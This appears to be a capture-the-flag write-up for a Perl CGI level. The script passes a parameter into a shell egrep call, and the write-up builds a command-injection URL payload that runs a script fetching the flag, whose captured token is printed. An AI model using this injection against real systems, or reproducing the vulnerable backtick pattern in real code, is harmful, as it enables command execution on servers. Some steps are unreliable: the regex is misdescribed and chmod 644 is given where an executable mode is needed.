we have 1 file:
- level12.pl, containing:

===================================

#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
===================================

As we can see, the perl take two params x and y
these params are used in the line "@output = `egrep "^$xx" /tmp/xd 2>&1`;"
that we suppose that we can do a command injection !

BUT
There is two regex wicch modify our cmd injection before being executed:
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
The first is obvious, it transforms lowercases into Uppercases
the second is trickier, it takes string after the last whistspace,

We try do deal with it:

First create a file "FILE" containing:
   #!/bin/bash
   
   getflag > /tmp/token

then chmod 644 on it in order 

Finnaly, type in a browser: http://172.16.254.130:4646/?x=%22`/*/FILE`%22 

token is: g1qKMiRpXf53AWhDaU7FEkczr which is the flag

dadada !

See flag in flag file
